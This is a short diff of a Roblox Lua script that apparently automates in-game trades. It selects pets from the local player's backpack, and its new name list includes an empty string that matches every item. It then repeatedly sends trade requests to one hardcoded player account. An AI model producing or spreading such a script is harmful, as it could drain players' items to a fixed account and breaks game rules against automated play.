@@ -20,7 +20,7 @@ function equipticket()
 	end
 end
 function additem()
-	local listpet = {"Starfish", "Capybara", "Dog", "Dragon"} 
+	local listpet = {"Kitsune", "Dragonfly", "French", "Raiju","Red Fox",""} 
 	for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
 		for _, petName in ipairs(listpet) do
 			if string.find(v.Name, petName) then
@@ -44,10 +44,14 @@ while wait(1) do
 			Confirm:FireServer()
 		end
 	else
-		equipticket()
-		SendRequest:FireServer(
-			Players.ThanhTuoi_IsFake
-		)
+		if playerFound then
+			equipticket()
+			SendRequest:FireServer(
+				Players.ThanhTuoi_IsFake
+			)
+		else
+				wait(10)
+		end
 	end
 	end)
 end
